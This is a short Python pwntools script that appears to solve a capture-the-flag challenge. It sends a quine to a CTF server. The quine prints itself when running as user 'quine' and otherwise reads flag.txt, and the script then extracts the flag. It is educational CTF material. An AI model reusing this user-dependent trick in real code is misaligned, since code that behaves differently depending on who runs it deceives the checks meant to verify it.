from pwn import remote
import re

# Build the quine that prints itself when run as user 'quine', otherwise prints the flag
s = "import os, pwd, sys; s=%r; sys.stdout.write(s%%s if os.getuid()==pwd.getpwnam('quine').pw_uid else open('flag.txt').read())"
quine = s % s

# Connect to the challenge server
host = "chal.bearcatctf.io"
port = 31806
io = remote(host, port)
io.recvuntil(b"> ")
io.sendline(quine.encode())

# Receive all output
output = io.recvall().decode()
print("Received:")
print(output)

# Extract the flag
match = re.search(r'BCCTF\{.*?\}', output)
if match:
    print("Flag:", match.group())
else:
    print("Flag not found")
